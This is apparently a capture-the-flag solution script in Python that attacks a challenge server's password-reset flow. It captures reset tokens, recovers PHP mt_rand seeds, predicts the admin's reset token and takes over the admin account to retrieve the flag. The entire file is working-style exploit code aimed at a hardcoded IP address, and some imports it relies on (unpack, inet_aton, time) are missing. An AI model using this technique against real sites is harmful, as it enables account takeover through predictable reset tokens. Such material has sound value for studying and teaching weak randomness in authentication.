from socket import socket
from time import sleep


# PHP's ip2long in python
def ip2long(ip):
    return unpack("!L", inet_aton(ip))[0]


# POST with keep-alive
def post(s, data, recv=True):
    print(data)
    data = '''POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: %d
Connection: keep-alive
Host: 52.69.0.204

%s''' % (len(data), data)
    s.send(data)
    if recv:
        print(s.recv(1024))


u = 'ccm%s' % time()  # random username
myip = ip2long('10.20.30.40')  # my ip

# connect to challenge server
s = socket()
s.connect(('52.69.0.204', 80))

# create account
post(s, 'mode=register&username=%s&password=%s' % (u, u))

# reset our account to obtain initial mt_rand() value
post(s, 'mode=reset&username=%s' % u, False)

# start server to capture response
s2 = socket()
s2.bind(('0.0.0.0', 13110))  # locally natting from 110 -> 13110
s2.listen(1)
s2, addr = s2.accept()
token = int(s2.recv(1024)[6:])
s2.close()

token ^= myip  # get actual token
print(token)  # feed this to php_mt_seed tool
s.recv(1024)  # flush socket buffer

# reset again, since we can have multiple seeds for a given mt_rand value it's better
# to have another seed to validate our results with
post(s, 'mode=reset&username=%s' % u, False)
s2 = socket()
s2.bind(('0.0.0.0', 13110))
s2.listen(1)
s2, addr = s2.accept()
token = int(s2.recv(1024)[6:])
s2.close()
token ^= myip
print(token)
s.recv(1024)

# now pull the connection with keep-alives open, if the connection closes we can't do anything anymore
# hitting ctrl+c when we got our admin key allows us to continue
try:
    while True:
        sleep(4)
        post(s, 'mode=login', False)
        s.recv(1024)
except KeyboardInterrupt:
    pass


# reset admin token
post(s, 'mode=reset&username=admin')

# get token
token = int(input('admin token?'))

# get new admin password
post(s, 'mode=verify&token=%d' % token, True)

data = s.recv(1024)
pw = data[-16:]
print(pw)  # we got the pw

post(s, 'mode=login&username=admin&password=%s' % pw)  # get flag
